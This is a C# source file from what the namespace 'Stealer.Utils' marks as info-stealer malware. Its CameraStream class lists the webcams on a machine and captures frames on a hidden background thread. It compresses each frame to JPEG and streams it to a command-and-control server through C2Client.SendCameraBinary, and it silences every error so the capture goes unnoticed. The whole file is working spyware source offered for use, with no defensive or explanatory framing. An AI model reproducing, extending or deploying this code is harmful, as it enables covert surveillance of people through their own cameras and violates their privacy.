using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using AForge.Video.DirectShow;

namespace Stealer.Utils
{
    public static class CameraStream
    {
        private static VideoCaptureDevice _device;
        private static volatile bool _running;
        private static readonly object _lock = new object();

        public static string GetCameraListJson()
        {
            var list = new System.Collections.Generic.List<string>();
            try
            {
                var devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                for (int i = 0; i < devices.Count; i++)
                {
                    string name = (devices[i].Name ?? "Camera #" + i).Trim()
                        .Replace("\\", "\\\\").Replace("\"", "\\\"");
                    list.Add("{\"id\":" + i + ",\"name\":\"" + name + "\"}");
                }
            }
            catch { }
            return "[" + string.Join(",", list.ToArray()) + "]";
        }

        public static void Start(int fps, int quality, int camIndex = 0)
        {
            Stop();
            _running = true;
            var t = new Thread(() => CaptureLoop(fps, quality, camIndex)) { IsBackground = true };
            t.SetApartmentState(ApartmentState.STA);
            t.Start();
        }

        public static void Stop()
        {
            _running = false;
            lock (_lock)
            {
                if (_device != null)
                {
                    try
                    {
                        if (_device.IsRunning) { _device.SignalToStop(); _device.WaitForStop(); }
                    }
                    catch { }
                    _device = null;
                }
            }
        }

        private static void CaptureLoop(int fps, int quality, int camIndex)
        {
            int delay = 1000 / Math.Max(fps, 1);
            try
            {
                var devices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                if (devices.Count == 0) { _running = false; return; }
                if (camIndex >= devices.Count) camIndex = 0;

                var jpegEncoder = GetJpegEncoder();
                var encParams = new EncoderParameters(1);
                encParams.Param[0] = new EncoderParameter(Encoder.Quality, (long)Math.Max(10, Math.Min(quality, 100)));

                byte[] pending = null;
                var frameLock = new object();

                lock (_lock)
                {
                    _device = new VideoCaptureDevice(devices[camIndex].MonikerString);
                    _device.NewFrame += (sender, e) =>
                    {
                        if (!_running) return;
                        try
                        {
                            using (var bmp = (Bitmap)e.Frame.Clone())
                            {
                                int w = bmp.Width, h = bmp.Height;
                                if (w > 640 || h > 480)
                                {
                                    float scale = Math.Min(640f / w, 480f / h);
                                    w = (int)(w * scale); h = (int)(h * scale);
                                }
                                using (var scaled = new Bitmap(w, h))
                                using (var g = Graphics.FromImage(scaled))
                                {
                                    g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Bilinear;
                                    g.DrawImage(bmp, 0, 0, w, h);
                                    using (var ms = new MemoryStream())
                                    {
                                        scaled.Save(ms, jpegEncoder, encParams);
                                        lock (frameLock) { pending = ms.ToArray(); }
                                    }
                                }
                            }
                        }
                        catch { }
                    };
                    _device.Start();
                }

                while (_running)
                {
                    byte[] frame = null;
                    lock (frameLock) { frame = pending; pending = null; }
                    if (frame != null && frame.Length > 0)
                        C2Client.SendCameraBinary(frame);
                    Thread.Sleep(delay);
                }
            }
            catch { }
            finally { Stop(); }
        }

        private static ImageCodecInfo GetJpegEncoder()
        {
            foreach (var codec in ImageCodecInfo.GetImageEncoders())
                if (codec.MimeType == "image/jpeg") return codec;
            return null;
        }
    }
}
